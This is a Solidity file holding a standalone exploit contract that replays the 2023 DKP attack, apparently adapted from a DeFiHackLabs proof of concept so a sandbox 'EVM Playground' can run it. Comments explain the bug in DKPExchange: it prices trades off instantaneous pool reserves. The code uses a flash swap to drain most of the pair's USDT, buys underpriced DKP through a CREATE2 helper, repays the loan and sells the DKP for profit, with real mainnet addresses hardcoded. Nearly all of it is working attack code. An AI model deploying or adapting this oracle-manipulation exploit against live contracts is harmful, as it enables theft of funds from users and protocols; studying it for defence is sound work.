// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-03-DKP).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (ContractTest is Test; testExploit() does everything, and the
// PancakeSwap flash-swap callback `pancakeCall` lives on the test itself),
// so there is no standalone exploit contract to deploy. This is a
// self-contained standalone copy of that inline attack (testExploit -> run(),
// pancakeCall unchanged, including the CREATE2-salted helper deploy) so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/DKP_exp.sol.
//
// Root cause: DKPExchange (closed-source, 0x89257A52Ad585Aacb1137fCc8abbD03a963B9683)
// prices its USDT->DKP exchange() off the INSTANTANEOUS spot reserves of the
// PancakeSwap USDT/DKP pair (DKP.balanceOf(pair) / USDT.balanceOf(pair)), with
// no TWAP/staleness/depth protection. A single flash-swap that drains ~99.92%
// of the pair's USDT collapses the denominator, so exchange() pays out DKP at
// an ~25x-too-generous rate. The attacker buys the undervalued DKP, repays the
// flash loan (restoring the pair), then dumps the DKP back into the
// now-fair-priced pair via the router for a large USDT profit.
//
// Why the CREATE2-salted helper: DKPExchange.exchange() requires the caller to
// have pre-approved USDT and to be the recipient of the DKP payout. A
// throwaway helper contract (ExchangeDKP) is deployed via `new{salt:...}` so
// its address can be precomputed (getAddress) and pre-funded with 100 USDT
// via a direct transfer BEFORE the helper exists -- the helper's constructor
// then runs entirely in one shot (approve -> exchange -> forward DKP to the
// caller). This is just a deployment convenience for a fresh single-use
// contract; it has no bearing on the price-manipulation bug itself.

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IDKPExchange {
    function exchange(uint256 amount) external;
}

contract DKPDrain {
    IERC20 internal constant DKP = IERC20(0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19);
    IERC20 internal constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IUniswapV2Pair internal constant Pair = IUniswapV2Pair(0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7);
    IPancakeRouter internal constant Router = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IDKPExchange internal constant DKPExchange = IDKPExchange(0x89257A52Ad585Aacb1137fCc8abbD03a963B9683);

    // entrypoint: recorded by the playground.
    function run() external {
        exchangeDKP();
        DKPToUSDT();
    }

    function exchangeDKP() internal {
        uint256 flashAmount = USDT.balanceOf(address(Pair)) * 9992 / 10_000;
        Pair.swap(flashAmount, 0, address(this), abi.encode(flashAmount));
    }

    // PancakeSwap V2 flash-swap callback.
    function pancakeCall(address, /*sender*/ uint256, /*amount0*/ uint256, /*amount1*/ bytes calldata data)
        external
    {
        bytes memory contractByteCode = type(ExchangeDKP).creationCode;
        uint256 salt = uint256(keccak256("salt"));
        address receiver = getAddress(contractByteCode, salt);
        // Pre-fund the not-yet-deployed helper's precomputed CREATE2 address
        // with the 100 USDT it will need the instant its constructor runs.
        USDT.transfer(receiver, 100 * 1e18);
        new ExchangeDKP{salt: keccak256("salt")}();
        uint256 returnAmount = abi.decode(data, (uint256)) * 10_000 / 9975 + 1000;
        USDT.transfer(address(Pair), returnAmount);
    }

    function DKPToUSDT() internal {
        DKP.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(DKP);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            DKP.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        return address(uint160(uint256(hash)));
    }
}

// Throwaway CREATE2-deployed helper: uses its pre-funded 100 USDT to buy DKP
// from DKPExchange at the (flash-loan-corrupted) spot-reserve price, then
// forwards the DKP to whoever deployed it.
contract ExchangeDKP {
    IERC20 internal constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 internal constant DKP = IERC20(0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19);
    IDKPExchange internal constant DKPExchange = IDKPExchange(0x89257A52Ad585Aacb1137fCc8abbD03a963B9683);

    constructor() {
        USDT.approve(address(DKPExchange), type(uint256).max);
        DKPExchange.exchange(100 * 1e18);
        DKP.transfer(msg.sender, DKP.balanceOf(address(this)));
    }
}
